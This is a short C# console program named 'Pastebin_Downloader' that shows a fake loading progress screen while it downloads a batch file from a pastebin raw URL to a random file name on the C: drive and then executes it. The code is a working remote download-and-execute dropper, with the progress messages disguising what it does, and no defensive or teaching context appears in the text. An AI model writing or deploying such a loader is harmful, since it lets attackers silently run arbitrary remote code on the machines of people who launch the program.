using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;


namespace Pastebin_Downloader
{
    class Application
    {
        static void Main(string[] args)
        {
            {
                using (WebClient web = new WebClient())
                {
                    {
                        Console.Title = "Loading...";
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Thread.Sleep(100);
                        Console.WriteLine("Loading - <12%>");
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Thread.Sleep(100);
                        Console.Clear();
                        Console.WriteLine("Loading - <48%>");
                        web.DownloadFile("https://pastebin.com/raw/EXAMPLE383", @"C:\90j7g12vb.bat");
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Thread.Sleep(100);
                        Console.Clear();
                        Console.WriteLine("Loading - <100%>");
                        Thread.Sleep(100);
                        Console.Clear();
                        Process.Start(new ProcessStartInfo()
                        {
                          FileName = "C:\\90j7g12vb.bat",
                          UseShellExecute = true,
                          Verb = "open"
                        });
                    }
                }
            }
        }
    }
}